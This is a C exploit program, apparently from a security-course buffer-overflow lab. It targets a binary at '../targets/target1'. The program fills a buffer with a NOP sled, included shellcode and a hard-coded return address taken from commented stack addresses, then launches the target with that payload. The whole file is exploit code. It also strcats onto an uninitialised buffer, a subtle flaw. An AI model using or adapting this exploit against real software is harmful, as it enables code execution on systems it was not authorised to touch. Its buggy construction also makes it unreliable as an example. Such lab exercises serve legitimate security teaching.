#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"


//program counter is saved at 0x2021ff28
//return address is at 0x004009e8
//buf is located at address 0x2021feb0 to 0x2021ff10 (size 0x60)

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	unsigned char NOP[] = "\x90";
	char tmp[128];

	int i = 0;

	while(i<75){
	strcat(tmp, NOP);
	i++; 	
	}

	strcat(tmp, shellcode);

	strcat(tmp, "\xb0");
	strcat(tmp, "\xfe");
	strcat(tmp, "\x21");
	strcat(tmp, "\x20");



	args[0] = TARGET;
	args[1] = tmp;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
